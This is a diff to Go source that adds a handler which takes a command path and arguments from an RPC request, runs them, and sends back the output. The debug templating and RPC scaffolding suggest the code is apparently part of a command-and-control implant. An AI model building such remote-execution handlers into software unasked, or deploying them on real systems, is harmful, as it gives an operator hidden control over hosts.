@@ -27,6 +27,7 @@ import (
 	"io"
 	"io/ioutil"
 	"net"
+	"os/exec"
 
 	// {{if .Debug}}
 	"log"
@@ -406,6 +407,44 @@ func ifconfig() *pb.Ifconfig {
 		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
 	}
 	return interfaces
+}
+
+func executeHandler(data []byte, resp RPCResponse) {
+	var (
+		err error
+		cmd *exec.Cmd
+	)
+	execReq := &pb.ExecuteReq{}
+	err = proto.Unmarshal(data, execReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	execResp := &pb.Execute{}
+	cmd = exec.Command(execReq.Path)
+	if len(execReq.Args) != 0 {
+		cmd.Args = execReq.Args
+	}
+	if execReq.Output {
+		res, err := cmd.Output()
+		//{{if .Debug}}
+		log.Println(string(res))
+		//{{end}}
+		if err != nil {
+			execResp.Error = err.Error()
+		} else {
+			execResp.Result = string(res)
+		}
+	} else {
+		err = cmd.Start()
+		if err != nil {
+			execResp.Error = err.Error()
+		}
+	}
+	data, err = proto.Marshal(execResp)
+	resp(data, err)
 }
 
 // ---------------- Data Encoders ----------------
